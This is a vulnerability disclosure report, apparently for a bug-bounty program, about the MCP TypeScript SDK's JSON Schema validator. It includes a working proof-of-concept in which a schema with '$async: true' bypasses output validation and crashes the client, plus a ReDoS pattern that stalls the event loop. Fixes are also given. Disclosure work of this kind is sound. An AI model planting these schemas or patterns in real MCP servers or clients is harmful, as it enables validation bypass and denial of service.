# Anthropic — Unauthenticated MCP server can bypass client output-schema validation and crash the client via `$async` JSON Schema

| Field | Value |
|---|---|
| **Program** | [Anthropic](https://hackerone.com/anthropic) — https://hackerone.com/anthropic |
| **Asset** | `https://github.com/modelcontextprotocol/typescript-sdk` (Source code, in scope, eligible) |
| **Component** | `@modelcontextprotocol/core-internal` — `src/validators/ajvProvider.ts` (`AjvJsonSchemaValidator.getValidator`) |
| **Versions tested** | repo `develop`/`main` HEAD (2026-10-10) with the SDK-pinned `ajv@8.18.0` + `ajv-formats@3.0.1` |
| **Weakness** | CWE-20: Improper Input Validation (also CWE-754: Improper Check or Handling of Exceptional Conditions) |
| **Severity** | Medium · CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L` = 5.3 |
| **Status** | 🟡 Submitted |

---

## Summary

`AjvJsonSchemaValidator` compiles JSON Schema with `{ strict: false, validateFormats: true, validateSchema: false, allErrors: true }` and wraps the compiled validator like this:

```ts
// packages/core-internal/src/validators/ajvProvider.ts
return (input: unknown): JsonSchemaValidatorResult<T> => {
    const valid = ajvValidator(input);
    return valid ? { valid: true, data: input as T, errorMessage: undefined } : { ... };
};
```

When the schema contains `$async: true`, AJV compiles an **async** validator that returns a **Promise** instead of a boolean. A Promise is always truthy, so `valid ? … : …` takes the *valid* branch — **every input passes validation** — and the promise rejection that follows is never handled.

Because the schema is attacker-controlled in the MCP threat model, this is remote:

1. A malicious/compromised **MCP server** answers `tools/list` with a tool whose `outputSchema` contains `$async: true`.
2. The **client** compiles that schema — `packages/client/src/client/client.ts:1846` (`_compileOutputValidator(tool)` → `this._jsonSchemaValidator.getValidator(tool.outputSchema)`). The `try/catch` there only wraps *compilation*; nothing catches a validation-time rejection.
3. On `callTool`, the compiled validator runs against server-supplied output:
   - the result is reported as `{ valid: true }` even for data the schema rejects → **validation bypass**;
   - the rejected Promise surfaces as an **unhandled rejection** → default Node (≥15, `--unhandled-rejections=throw`) **terminates the client process**.

A second, independent class was measured in the same path: an attacker-supplied `pattern` such as `^(a+)+$` is compiled by AJV without any complexity limit and blocks the client's event loop — **54,899 ms** for a 30-character input.

## Steps to reproduce

Standalone, no MCP server or account required. This uses the SDK's own validator class, bundled from the repository source:

```bash
mkdir poc && cd poc
npm init -y
npm install ajv@8.18.0 ajv-formats@3.0.1
# bundle the repository file as-is (ajv left external so the pinned version resolves at runtime)
npx esbuild "<repo>/packages/core-internal/src/validators/ajvProvider.ts" \
  --bundle --platform=node --format=cjs \
  --external:ajv --external:ajv/dist/* --external:ajv-formats \
  --outfile=ajvprovider.bundle.js
```

```js
// poc.js
const { AjvJsonSchemaValidator } = require('./ajvprovider.bundle.js');
const validator = new AjvJsonSchemaValidator();
const validate = validator.getValidator({
    $async: true,
    type: 'object',
    properties: { n: { type: 'number' } },
    required: ['n']
});
console.log(JSON.stringify(validate({ TOTALLY: 'wrong' })));  // should be invalid
```

```bash
node poc.js
```

## Evidence

Actual output on the released/pinned engines:

```
--- PoC lewat API SDK mereka: AjvJsonSchemaValidator.getValidator() ---
hasil getValidator: {"valid":true,"data":{"TOTALLY":"wrong"}}
>>> BUG TERBUKTI: input invalid dinyatakan valid (bypass)
>>> unhandled rejection tertangkap: Error: validation failed
```

(`TOTALLY` is not the required `n`; the schema rejects the input, yet the SDK reports it as valid. Without a `process.on('unhandledRejection')` handler the rejection terminates the process.)

ReDoS measurement, same path:

```
--- pattern jahat (ReDoS) ---
validasi false butuh 54899 ms        ← 55 s for one 30-char string
```

Control (a schema without `$async`) behaves correctly: invalid input → `{ valid: false, … }`.

## Impact

- **Validation bypass (the client's containment boundary).** Output-schema validation (SEP-2106) is the client's only check on server-supplied tool output. One extra key in a remote schema disables it completely, so downstream application code consumes unvalidated, attacker-shaped data.
- **Client process termination (availability).** The unhandled rejection is deterministic: a connected malicious server kills the host application (agent, IDE integration, CI runner) — no privileges and no user interaction beyond using the tool. The same server can also block the event loop for minutes with a crafted `pattern` (measured 55 s; patterns with worse backtracking exist).
- **Blast radius is every Node consumer of the SDK**, since `AjvJsonSchemaValidator` is the default Node validator and `Client` wires it to server-supplied schemas automatically.

## Remediation

1. **Fail closed on non-boolean results** — this closes the whole class, not just `$async`:

```ts
const valid = ajvValidator(input);
if (valid !== true) {
    return { valid: false, data: undefined, errorMessage: engine.errorsText(ajvValidator.errors) };
}
return { valid: true, data: input as T, errorMessage: undefined };
```

2. **Reject async schemas from peers**: detect a root-level `$async: true` in `getValidator` and surface it through the existing `{ ok: false, compileError }` path in `_compileOutputValidator`.
3. **Bound `pattern` for peer-supplied schemas** (length/complexity cap, or a backtracking-free regex engine), so an untrusted schema cannot stall the event loop.

## Process notes

- No account, no credential, and no request to any Anthropic/MCP-operated service was used — the finding is a local code analysis plus a local PoC, as the program requires for source-code assets.
- No scanners: the PoC is a hand-written 6-line script against the SDK's public API.
- Out-of-scope classes deliberately avoided — not a permission-modal bypass (the class the program states is under remediation), not a jailbreak/model-content issue, and not an auto-accept-edits behaviour.
